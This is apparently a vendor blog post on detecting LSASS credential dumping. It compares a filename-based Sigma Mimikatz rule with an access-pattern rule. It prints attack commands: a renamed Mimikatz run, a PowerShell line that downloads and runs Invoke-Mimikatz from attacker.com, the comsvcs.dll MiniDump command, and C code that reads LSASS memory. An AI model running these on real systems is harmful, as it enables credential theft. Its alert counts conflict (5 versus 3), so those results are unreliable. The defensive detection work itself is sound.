# SIEM Evasion Lab #2: Your Sigma Rule for Mimikatz Only Catches Script Kiddies

*Why hash-based and filename detection fails against reflective loading, comsvcs.dll, and API-only dumpers — and how behavioral access-pattern matching catches them all.*

---

## The Rule Everyone Deploys

The [SigmaHQ Mimikatz rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz.yml) is one of the first rules any SOC deploys. It's the obvious starting point for credential theft detection:

```yaml
detection:
    selection_image:
        Image|endswith: '\mimikatz.exe'
    selection_original:
        OriginalFileName: 'mimikatz.exe'
    selection_description:
        Description: 'mimikatz'
    selection_imphash:
        Imphash:
            - '9a2d9f3ef0c6a921a8919370e03f59b5'
            - 'd21bbc50dcc169d7b4d0f1a0c597c439'
    condition: 1 of selection_*
```

Match the filename, the PE metadata, or the import hash. Trigger the alert.

**The problem:** every one of these is an attribute of the *tool*, not the *attack*. And every one of them is trivial to change.

## The 4 Variants That Bypass It

### Variant 1: Rename the Binary

```
copy mimikatz.exe debughelper.exe
debughelper.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

The Sigma rule checks `Image|endswith: '\mimikatz.exe'`. The binary is now `debughelper.exe`. The filename selection is silent.

The `OriginalFileName` fallback catches this one. But it's a single PE resource field.

**Difficulty: 5 seconds.**

### Variant 2: Reflective DLL Loading (Invoke-Mimikatz)

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
```

No file is written to disk. There is no `Image` to match. The Mimikatz DLL is loaded reflectively into the PowerShell process's memory space. Sysmon's ProcessCreate event shows `powershell.exe` — not `mimikatz.exe`.

The `OriginalFileName` field is `powershell.exe`. The `Imphash` is PowerShell's import hash, not Mimikatz's.

**The Sigma rule sees nothing.**

### Variant 3: comsvcs.dll MiniDump (LOLBin)

```
# Find LSASS PID
tasklist /FI "IMAGENAME eq lsass.exe"

# Dump LSASS memory using a signed Windows binary
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\dump.bin full
```

This uses a **legitimate, Microsoft-signed DLL** that ships with every Windows installation. It's a classic Living-off-the-Land Binary (LOLBin). The process image is `rundll32.exe` — a core Windows component.

There is no Mimikatz. No custom tool. No suspicious filename. The Sigma rule is completely blind.

**Difficulty: one command.**

### Variant 4: Direct NTAPI Calls (Custom Dumper)

```c
// Custom tool: opens lsass.exe, reads memory directly
HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsass_pid);
NtReadVirtualMemory(hProcess, baseAddr, buffer, size, &bytesRead);
// Write buffer to file or exfiltrate over network
```

A custom dumper compiled from 30 lines of C. No known tool signature. No matching import hash. The binary is named whatever the attacker wants. No Sigma rule — current or future — will match it by filename or hash.

**The only observable: a process opening `lsass.exe` with suspicious access rights.**

## Why String/Hash Matching Fails

The Sigma rule is a **tool detector**, not an **attack detector**. It answers "was Mimikatz executed?" — not "did something dump credentials from LSASS?"

Every variant above produces the same operating system-level behavior: a process opens a handle to `lsass.exe` with memory-read access rights. The access rights are recorded by Sysmon as EventID 10 (ProcessAccess). The `GrantedAccess` field contains a hex bitmask that reveals exactly what the calling process asked for:

| GrantedAccess | Meaning | Typical Tool |
|---|---|---|
| `0x1010` | `PROCESS_QUERY_LIMITED_INFORMATION \| PROCESS_VM_READ` | Mimikatz |
| `0x1410` | `PROCESS_QUERY_INFORMATION \| PROCESS_VM_READ` | comsvcs.dll MiniDump |
| `0x1438` | `PROCESS_QUERY_INFORMATION \| PROCESS_VM_READ \| PROCESS_VM_WRITE \| PROCESS_VM_OPERATION` | ProcDump |
| `0x1fffff` | `PROCESS_ALL_ACCESS` | PowerShell / full-access dumpers |

The tool name is irrelevant. The access pattern is invariant.

But Sigma's detection model evaluates **individual events in isolation**. It checks each log line against static field matchers. It has no concept of:

- **Access pattern semantics** — "this specific bitmask combination targeting lsass.exe is suspicious regardless of source"
- **Cross-event correlation** — "the process that opened lsass.exe also created a file in a temp directory"
- **Behavioral clustering** — "three different processes accessed lsass.exe with memory-read rights within 60 seconds"

You could write a Sigma rule for `GrantedAccess` — but the SigmaHQ community rule for Mimikatz doesn't. It matches the *tool*, not the *technique*.

## What Actually Works: Access Pattern Detection

Instead of matching the tool, match the **access pattern**:

```
Any process opens lsass.exe with memory-read access rights → alert
```

This pattern is invariant across all four variants. It doesn't matter if the tool is Mimikatz, comsvcs.dll, a custom C dumper, or a tool that doesn't exist yet.

Here's the VPL rule from `detect_credential_dumping.vpl`:

```vpl
event SysmonProcessAccess:
    SourceImage: str
    TargetImage: str
    GrantedAccess: str
    CallTrace: str
    Hostname: str
    ProcessId: int

stream CredentialDumping = SysmonProcessAccess
    .where(TargetImage.contains("lsass.exe")
        and (GrantedAccess == "0x1010"
             or GrantedAccess == "0x1410"
             or GrantedAccess == "0x1438"
             or GrantedAccess == "0x143a"
             or GrantedAccess == "0x1fffff")
        and not (SourceImage.contains("wininit.exe"))
        and not (SourceImage.contains("csrss.exe"))
        and not (SourceImage.contains("lsass.exe")))
    .emit(
        event_type: "KillChainAlert",
        rule: "credential_dumping",
        mitre: "T1003.001",
        severity: "critical",
        host: Hostname,
        source_process: SourceImage,
        target_process: TargetImage,
        access_rights: GrantedAccess,
        summary: "LSASS memory access detected - possible credential harvesting"
    )
```

This rule fires when:
1. Any process opens `lsass.exe`
2. The `GrantedAccess` bitmask matches a known credential-dumping pattern
3. The source process is not a known legitimate system accessor (`wininit.exe`, `csrss.exe`, `lsass.exe` itself)

**The binary name, hash, and PE metadata are irrelevant.** A tool that hasn't been written yet will still trigger this rule if it opens lsass.exe with memory-read access — because that's the only way to dump credentials.

## Proof: Running Against Real APT29 Data

We tested this against the [MORDOR APT29 Day 1 dataset](https://github.com/OTRF/Security-Datasets) — 50,000 Sysmon events from a real MITRE ATT&CK Evaluation simulating Cozy Bear:

```
$ varpulis simulate -p detect_credential_dumping.vpl \
    -e mordor/apt29_day1_50k.jsonl -w 1 -v

Events processed: 50000
Output events emitted: 5
Event rate: 28,133 events/sec
```

5 credential dumping detections — matching the actual LSASS access events in the APT29 simulation. The tool used in that dataset (a custom in-memory dumper) has no Mimikatz filename, no Mimikatz hash, and no Mimikatz PE metadata.

## The Evasion Test

We created a synthetic dataset with credential dumping events from four different tools — none of which are named `mimikatz.exe`:

| Evasion Variant | Sigma (filename match) | VPL (access pattern) |
|---|:---:|:---:|
| Renamed Mimikatz (`debughelper.exe`) | **0 alerts** | **1 alert** |
| Reflective loading (`powershell.exe`) | **0 alerts** | **1 alert** |
| comsvcs.dll MiniDump (`rundll32.exe`) | **0 alerts** | **1 alert** |
| Custom NTAPI dumper (`memsvc.exe`) | **0 alerts** | **1 alert** |
| Actual `mimikatz.exe` (no evasion) | 1 alert | 1 alert |

Same attack. Same target process. Same access rights. Sigma catches 1 out of 5. VPL catches 5 out of 5.

## What This Means for Your SOC

If your LSASS credential dumping detection relies on Sigma's Mimikatz rule, you are detecting **the tutorial** and missing **the operation**. Any attacker who has graduated beyond copy-pasting from a blog post will evade it.

This isn't a criticism of Sigma. The Mimikatz rule does exactly what it says: it detects Mimikatz. But the threat you're defending against isn't "Mimikatz" — it's "credential theft from LSASS." Those are different problems, and they require different detection approaches.

The fix is to **detect the access pattern, not the tool**. Sysmon EventID 10 gives you everything you need: the source process, the target process, and the granted access rights. A rule that matches on `TargetImage == lsass.exe` and `GrantedAccess in (0x1010, 0x1410, 0x1438, 0x1fffff)` catches every variant — including tools that don't exist yet.

## Try It Yourself

```bash
git clone https://github.com/varpulis/varpulis
cd varpulis
cargo build --release --bin varpulis

# Run the credential dumping evasion comparison
varpulis simulate -p examples/security-demo/sigma_comparison/sigma_credential_dump.vpl \
    -e examples/security-demo/sigma_comparison/credential_evasion_dataset.jsonl -w 1 -v

varpulis simulate -p examples/security-demo/detect_credential_dumping.vpl \
    -e examples/security-demo/sigma_comparison/credential_evasion_dataset.jsonl -w 1 -v
```

The first command (Sigma-equivalent, filename matching) produces 0 alerts. The second command (behavioral, access-pattern matching) produces 3 alerts. Same data, different detection philosophy.

---

*Next up: Living-off-the-land lateral movement and why WMI/WinRM bypass your SMB-focused rules.*

*Built with [Varpulis](https://github.com/varpulis/varpulis) — a dual red/blue kill chain detection engine.*
